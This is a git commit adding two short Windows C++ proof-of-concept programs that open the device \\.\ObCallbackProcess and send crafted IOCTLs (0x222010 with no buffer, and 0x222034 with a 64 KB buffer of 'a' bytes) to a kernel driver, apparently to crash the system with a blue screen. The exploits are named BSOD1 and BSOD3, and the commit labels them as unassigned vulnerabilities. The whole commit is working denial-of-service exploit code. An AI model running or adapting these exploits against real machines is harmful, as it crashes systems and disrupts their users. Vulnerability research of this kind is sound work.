788a8092943ea0f07695c58bedb2f343c5897730
zeze <zezectf@gmail.com>
2023-03-24 17:10:46 +0800

    feat: unassigned34~36

---
+++ unassigned34/bin/DoS1.cpp
@@ -0,0 +1,29 @@
+﻿#include <iostream>
+#include <Windows.h>
+#include <winioctl.h>
+
+#define SymLinkName L"\\\\.\\ObCallbackProcess"
+
+HANDLE hDevice;
+
+void BSOD1_222010()
+{
+    DWORD dwWrite;
+    DeviceIoControl(hDevice, 0x222010, NULL, 0, NULL, 0, &dwWrite, NULL);
+}
+
+int main(int argc, char* argv[])
+{
+    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
+    if (hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
+        system("pause");
+        return 0;
+    }
+
+    BSOD1_222010();
+
+    system("pause");
+    return 0;
+}
---
+++ unassigned36/ObCallbackProcessExploit/ObCallbackProcessExploit.cpp
@@ -0,0 +1,31 @@
+﻿#include <iostream>
+#include <Windows.h>
+#include <winioctl.h>
+
+#define SymLinkName L"\\\\.\\ObCallbackProcess"
+
+HANDLE hDevice;
+
+void BSOD3_222034()
+{
+    DWORD dwWrite;
+    unsigned char data[0x10000];
+    memset(data, 'a', 0x10000);
+    DeviceIoControl(hDevice, 0x222034, data, 0x10000, NULL, 0, &dwWrite, NULL);
+}
+
+int main(int argc, char* argv[])
+{
+    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
+    if (hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
+        system("pause");
+        return 0;
+    }
+
+    BSOD3_222034();
+
+    system("pause");
+    return 0;
+}
